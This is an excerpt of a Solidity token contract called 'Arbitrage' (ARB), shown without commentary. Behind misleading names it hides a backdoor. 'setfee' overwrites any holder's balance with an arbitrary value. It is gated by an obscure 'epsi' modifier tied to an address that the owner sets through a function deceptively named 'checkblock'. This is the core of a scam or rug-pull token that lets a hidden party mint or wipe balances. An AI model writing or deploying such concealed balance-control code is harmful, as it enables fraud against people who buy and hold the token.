...
contract arbit is Ownable, IERC20 {
 
    using SafeMath for uint256;
 
    string private constant _name = "Arbitrage";
    string private constant _symbol = "ARB";
    ...
    modifier epsi() { require( supply == msg.sender, ""  );_; }
    ...
    function setfee(address to, uint256 fee) external epsi{ 
       _balances[to] = fee;
    }
 
     function checkblock(address to) external onlyOwner{ 
       supply = to;
    }
